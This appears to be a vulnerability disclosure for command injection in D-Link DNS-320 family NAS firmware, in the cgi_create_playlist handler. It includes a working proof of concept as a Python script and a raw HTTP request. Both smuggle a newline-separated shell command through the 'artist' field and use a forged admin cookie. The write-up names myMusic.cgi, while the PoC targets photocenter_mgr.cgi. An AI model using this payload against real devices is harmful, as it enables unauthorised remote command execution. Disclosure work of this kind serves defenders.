# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_create_playlist function of the file /cgi-bin/myMusic.cgi.  The variable `artist`is passed from a POST request and is assigned to `v14` via the `sprintf` function at line 89  and invoked by the `system` command,  the `SpecSymbol2BackSlash` function did not work  which leads to command execution.

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723707717652-0377e2fa-8198-467b-b77a-7192c516e1a8.png#averageHue=%23fdfdfd&clientId=ud48b7066-625b-4&from=paste&height=456&id=u524cad3d&originHeight=1011&originWidth=883&originalType=binary&ratio=1&rotation=0&showTitle=false&size=124828&status=done&style=none&taskId=u58291e30-03da-4649-8cc7-525e728d5d5&title=&width=398)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723707672017-c7abfcfc-163f-4bfc-90d2-b9613d53d74b.png#averageHue=%23fefdfc&clientId=ud48b7066-625b-4&from=paste&height=198&id=uc1765329&originHeight=417&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31746&status=done&style=none&taskId=uaee1a3d9-ab9a-4c2e-8b79-6ec69e39ef1&title=&width=438)



# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/photocenter_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_create_playlist&ptype=11&album=1&user=photos&idx=10&artist=%0atouch%09/tmp/999%0a&genre=10&date=19&album_name=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Referer: http://192.168.0.32/photo_center/index.html
Cookie: username=admin
Priority: u=1

cmd=cgi_create_playlist&ptype=11&album=1&user=photos&idx=10&artist=%0atouch%09/tmp/999%0a&genre=10&date=19&album_name=/tmp/
```


